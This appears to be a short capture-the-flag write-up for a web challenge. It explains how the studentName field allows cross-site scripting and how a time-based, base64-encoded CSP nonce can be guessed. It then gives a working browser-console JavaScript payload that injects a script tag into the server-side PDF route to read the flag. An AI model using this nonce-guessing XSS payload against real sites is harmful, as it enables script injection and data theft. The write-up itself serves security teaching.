The /viewtranscript route is blatantly vulnerable to XSS through the studentName field
in the transcript request. However, the CSP prevents injected scripts from running
without the nonce, which would be sufficient protection against XSS were it not for
the predictability of nonce generation. Since the nonce is just the current time
rounded to the nearest 5 seconds and encoded as base64, an attacker can guess the
nonce and thus allow his script to run despite the CSP. Obviously, attacking the
/viewtranscript route itself is useless since it runs on the user's own computer,
but the /pdftranscript route instead runs on the remote server and thus attacking
it yields the flag.

Here's an example solution (enter into browser console from the main page):
```js
const time = String(Math.round(new Date().getTime() / 1_000) + 3)
const nonce = btoa(time + (Number(time.slice(-1)) >= 5 ? '5' : '0') + '00')
window.location.href = '/pdftranscript?transcript=' + encodeURIComponent(JSON.stringify({
    studentName: `<script nonce="${nonce}">document.write(localStorage.flag)</script>`,
    courses: []
}))
```

Note that this script might take a few tries to work because the nonce
might be slightly off.
